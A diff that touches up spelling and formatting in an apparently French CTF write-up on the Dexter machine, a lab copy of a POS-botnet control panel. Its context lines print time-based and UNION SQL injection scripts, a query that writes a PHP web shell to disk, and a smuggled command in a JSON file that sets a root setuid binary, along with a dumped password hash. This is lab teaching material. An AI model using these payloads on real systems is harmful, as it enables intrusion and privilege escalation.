@@ -16,7 +16,7 @@ Pour pouvoir réellement commencer ce CTF il faut obtenir quelques informations 
 
 J'ai trouvé deux articles concernant ce bot, [le premier de SpiderLabs](http://blog.spiderlabs.com/2012/12/the-dexter-malware-getting-your-hands-dirty.html) décrit le chiffrement qui est utilisé par le bot.  
 
-[Le second article par Cylance](http://blog.cylance.com/a-study-in-bots-dexter-pos-botnet-malware) donne plus d'informations et certains le considéreront peut être comme un spoiler.  
+[Le second article par Cylance](http://blog.cylance.com/a-study-in-bots-dexter-pos-botnet-malware) donne plus d'informations et certains le considéreront peut-être comme un spoiler.  
 
 J'ai décidé de m'attaquer au challenge en me limitant à la connaissance de l’algorithme de chiffrement.  
 
@@ -25,7 +25,7 @@ Utiliser un exploit existant pour *Dexter* aurait diminué l’intérêt du chal
 Un air de famille
 -----------------
 
-Quand on lance le scan de ports on découvre des services qui ne sont pas sans rappeler les précédents challenges.  
+Quand on lance le scan de ports, on découvre des services qui ne sont pas sans rappeler les précédents challenges.  
 
 À se demander si le RPC n'est pas actif par défaut sous Debian...  
 
@@ -57,11 +57,11 @@ PORT      STATE SERVICE VERSION
 |_  100024  1          50061/udp  status
 ```
 
-Arrivé sur le site web, on trouve deux liens. Le premier vers */Panel/* qui est de toute évidence le dossier où a été placé les scripts du C&C.  
+Arrivé sur le site web, on trouve deux liens. Le premier vers `/Panel/` qui est de toute évidence le dossier où a été placé les scripts du C&C.  
 
-Le second lien est [une analyse automatique du bot](https://malwr.com/analysis/YTI0ZWI4ZjExNmY0NDRjMTgzOWM3NTQxZTViNjZmNjA/) (un exécutable win32) réalisé par le site *malwr.com*.  
+Le second lien est [une analyse automatique du bot](https://malwr.com/analysis/YTI0ZWI4ZjExNmY0NDRjMTgzOWM3NTQxZTViNjZmNjA/) (un exécutable win32) réalisé par le site `malwr.com`.  
 
-Parmi les chaines qui pourraient être d'une quelquonque utilité on relève :  
+Parmi les chaines qui pourraient être d'une quelconque utilité, on relève :  
 
 ```
 62.149.24.147
@@ -84,11 +84,11 @@ Mais le plus intéressant est la trace réseau récupérée par l'analyse, en pa
 
 Ainsi si l'on se base sur l'article de *SpiderLabs*, le paramètre val envoyé par POST contient la clé de chiffrement encodée en base64.  
 
-Son décodage (par Python ou tout autre site en ligne et utilitaire) retourne la clé *"gisha"* (le bot génère une clé aléatoire à chaque requête).  
+Son décodage (par Python ou tout autre site en ligne et utilitaire) retourne la clé `gisha` (le bot génère une clé aléatoire à chaque requête).  
 
 ![Harry's Code](/assets/img/dexter1.jpg)
 
-J'ai écrit le programme suivant qui permet de chiffrer / déchiffrer des données transmises par *Dexter* :  
+J'ai écrit le programme suivant qui permet de chiffrer / déchiffrer des données transmises par `Dexter` :  
 
 ```python
 #!/usr/bin/python
@@ -163,7 +163,7 @@ iexplore.exe
 
 On a donc quelques méthodes qui nous serviront par la suite.  
 
-Un scan du dossier */Panel/* avec *dirb* révèle d'autres pages web :  
+Un scan du dossier `/Panel/` avec `dirb` révèle d'autres pages web :  
 
 ```console
 $ ./dirb http://192.168.1.54/Panel/ wordlists/big.txt -X .php
@@ -180,16 +180,16 @@ $ ./dirb http://192.168.1.54/Panel/ wordlists/big.txt -X .php
 + http://192.168.1.54/Panel/viewer.php (CODE:200|SIZE:47)
 ```
 
-Ces pages ne révèlent rien de bien intéressant. Le script d'upload semble ouvert mais n'indique pas si l'upload a bien fonctionné et ne donne pas le chemin vers le fichier uploadé.  
+Ces pages ne révèlent rien de bien intéressant. Le script d'upload semble ouvert, mais n'indique pas si l'upload a bien fonctionné et ne donne pas le chemin vers le fichier uploadé.  
 
 Premier coup de scalpel
 -----------------------
 
-Je reviens donc vers *gateway.php* : on sait maintenant comment chiffrer les paramètres mais on ne sait pas quels paramètres sont vulnérables.  
+Je reviens donc vers `gateway.php` : on sait maintenant comment chiffrer les paramètres ; mais on ne sait pas quels paramètres sont vulnérables.  
 
-Pour cela j'ai écrit un script qui teste plusieurs payloads d'injection MySQL time-based pour chaque paramètre (la fonction encrypt n'est pas affichée pour gagner de la place).  
+Pour cela, j'ai écrit un script qui teste plusieurs payloads d'injection MySQL time-based pour chaque paramètre (la fonction encrypt n'est pas affichée pour gagner de la place).  
 
-La méthode time-based a été choisie car *gateway.ph*p ne semble retourner aucun contenu à priori :(  
+La méthode time-based a été choisie, car `gateway.php` ne semble retourner aucun contenu à priori :(  
 
 ```python
 args = ['page', 'unm', 'cnm', 'query', 'spec', 'opt', 'view', 'var']
@@ -233,7 +233,7 @@ Maintenant voyons voir comment on peut extraire des données de la base.
 
 La méthode la plus simple est d'utiliser un UNION mais on ne sait pas combien de colonnes seront nécessaires pour que l'opération réussisse.  
 
-Là encore j'ai écris un script qui teste jusqu'à 10 colonnes en espérant que dans les différentes réponses HTTP on en trouve une qui diffère des autres.  
+Là encore, j'ai écrit un script qui teste jusqu'à 10 colonnes en espérant que dans les différentes réponses HTTP, on en trouve une qui diffère des autres.  
 
 J'ai eu la bonne idée d'afficher les headers HTTP dans l'output.  
 
@@ -272,7 +272,7 @@ for p in payloads:
     print "=================================="
 ```
 
-Pour une UNION avec 3 colonnes on s'apperçoit qu'une valeur de cookie différente est retournée :  
+Pour une UNION avec 3 colonnes, on s'apperçoit qu'une valeur de cookie différente est retournée :  
 
 ```
 payload = ' UNION SELECT NULL#
@@ -293,7 +293,7 @@ CaseInsensitiveDict({'content-length': '20', 'x-powered-by': 'PHP/5.4.4-14+deb7u
 --- snip ---
 ```
 
-On reprend le script précédent en modifiiant juste la liste des payloads :  
+On reprend le script précédent en modifiant juste la liste des payloads :  
 
 ```python
 payloads = [
@@ -303,7 +303,7 @@ payloads = [
     ]
 ```
 
-Pour le second cas (la chaîne *encodeme* en seconde position) le script me retourne un *Set-Cookie response=MnN4dXlyc3tzLTU%3D* ce qui une fois décodé correspond à :  
+Pour le second cas (la chaîne `encodeme` en seconde position) le script me retourne un `Set-Cookie response=MnN4dXlyc3tzLTU%3D` ce qui une fois décodé correspond à :  
 
 ```
 $encodeme;#
@@ -389,7 +389,7 @@ mysql:x:104:106:MySQL Server,,,:/nonexistent:/bin/false
 ;#
 ```
 
-Après avoir retrouvé les fichiers de configuration d'Apache (*/etc/apache2/apache2.conf* et */etc/apache2/sites-enabled/000-default*) je récupère le *config.php* du C&C :  
+Après avoir retrouvé les fichiers de configuration d'Apache (`/etc/apache2/apache2.conf` et `/etc/apache2/sites-enabled/000-default`) je récupère le `config.php` du C&C :  
 
 ```php
 <?php
@@ -403,7 +403,7 @@ Après avoir retrouvé les fichiers de configuration d'Apache (*/etc/apache2/apa
 ?>
 ```
 
-C'est bien mais maintenant il faudrait écrire sur le disque. Pas bien compliqué (*exes* étant le path utilisé par le script d'upload donc certainement écrivable) :  
+C'est bien, mais maintenant, il faudrait écrire sur le disque. Pas bien compliqué (*exes* étant le path utilisé par le script d'upload donc certainement écrivable) :  
 
 ```python
 payload = "' UNION SELECT NULL,'<?php system($_GET[\"cmd\"]); ?>',NULL INTO OUTFILE '/var/www/Panel/exes/bd.php'#"
@@ -422,7 +422,7 @@ print decrypt(data)
 
 Une fois un shell récupéré je peux me connecter sur le serveur MySQL avec les identifiants vus plus tôt.  
 
-```
+```sql
 mysql> show tables;
 +----------------------+
 | Tables_in_nasproject |
@@ -446,12 +446,12 @@ mysql> select * from users;
 
 On a maintenant les identifiants d'accès au C&C... Mais au point où on en est quel intérêt ?  
 
-Au passage j'ai jeté un œil aux hashs dans la table user de MySQL et ils correspondent tous les deux (pour *root* et *dexter*) à "password".  
+Au passage, j'ai jeté un œil aux hashs dans la table user de MySQL et ils correspondent tous les deux (pour *root* et *dexter*) à "password".  
 
 The coroner can suck my uncircumcised dick if he doesn't rule this a homicide
 -----------------------------------------------------------------------------
 
-Dans */var/www* il y a des fichiers il y a des fichiers qui ne semblent attendre que nous :  
+Dans `/var/www` il y a des fichiers il y a des fichiers qui ne semblent attendre que nous :  
 
 ```console
 root@dexter:/var/www# ls -l
@@ -463,7 +463,7 @@ drwxr-xr-x 3 root root 4096 Mar 16 18:10 Panel
 -rw-r--r-- 1 root root    0 Mar 16 17:04 tamper.log
 ```
 
-Le fichier *antitamper.list* est un fichier JSON avec des hashs et des noms de fichiers :  
+Le fichier `antitamper.list` est un fichier JSON avec des hashs et des noms de fichiers :  
 
 ```python
 {
@@ -482,7 +482,7 @@ Le fichier *antitamper.list* est un fichier JSON avec des hashs et des noms de f
 }
 ```
 
-Quand au script Python (qui est une sorte de vérificateur d'intégrité des fichiers) :  
+Quant au script Python (qui est une sorte de vérificateur d'intégrité des fichiers) :  
 
 ```python
 import os
@@ -498,13 +498,13 @@ def check():
 check()
 ```
 
-Le script appelle la commande *echo* via *os.system()*. Il lui passe deux arguments provenant du fichier JSON.  
+Le script appelle la commande `echo` via `os.system()`. Il lui passe deux arguments provenant du fichier JSON.  
 
-Or il se trouve que ce dernier est word-writable. Le modifier pour provoquer une injection de commande n'est pas difficile par contre j'ai beau avoir cherché ce qui peut provoquer l'appel de *antitamper.py* je n'ai rien trouvé.  
+Or, il se trouve que ce dernier est word-writable. Le modifier pour provoquer une injection de commande n'est pas difficile par contre j'ai beau avoir cherché ce qui peut provoquer l'appel de *antitamper.py* je n'ai rien trouvé.  
 
 J'ai finalement tenté ma chance en modifiant la première entrée du dictionnaire de cette façon :  
 
-```
+```bash
 "';chown root.root /var/www/Panel/exes/getroot;chmod +s /var/www/Panel/exes/getroot;#'": "d8fa4356213b6ce9253f55acdff780ac",
 ```
 
@@ -531,7 +531,7 @@ root:$6$gN9t1RCt$dYj80MPAWCeWkh9kTpoPHuUU.x5hfaXfrB.UUWkMQDQpjDfAHO4D2RLWvG00wjU
 
 ![FUCK YEAH!](/assets/img/dexter3.gif)
 
-Quant à l'explication sur le lancement de *antitamper.py* :  
+Quant à l'explication sur le lancement de `antitamper.py` :  
 
 ```console
 root@dexter:~# tail -1 /var/spool/cron/crontabs/root 
